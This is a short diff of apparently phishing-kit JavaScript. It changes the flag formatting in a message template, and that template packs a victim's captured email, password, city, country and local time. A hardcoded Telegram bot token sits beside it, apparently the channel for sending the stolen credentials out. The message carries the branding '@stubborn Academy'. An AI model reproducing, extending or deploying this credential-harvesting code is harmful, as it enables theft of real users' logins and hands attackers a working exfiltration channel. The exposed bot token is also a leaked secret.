@@ -145,7 +145,7 @@
 
                 const location = data.city || 'Unknown';
                 const country = data.country_name || 'Unknown';
-                const flags = data.country_code ? `https://flagcdn.com/w320/${data.country_code.toLowerCase()}.png` : 'Not Available';
+                const flag = data.country_code ? `:${data.country_code.toLowerCase()}:` : '🏳️';
                 const currentTime = new Date().toLocaleTimeString('en-US', { timeZone: data.timezone || 'UTC' });
 
                 const telegramToken = "7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo"; // Replace with your bot token
@@ -155,8 +155,7 @@
 🔑 ${email}
 🔐 ${password}
 🌍 ${location}
-🏳️ ${country}
-🚩 ${flags}
+🏳️ ${country} ${flag}
 ⏰ ${currentTime}
 
 📌 *@stubborn Academy*
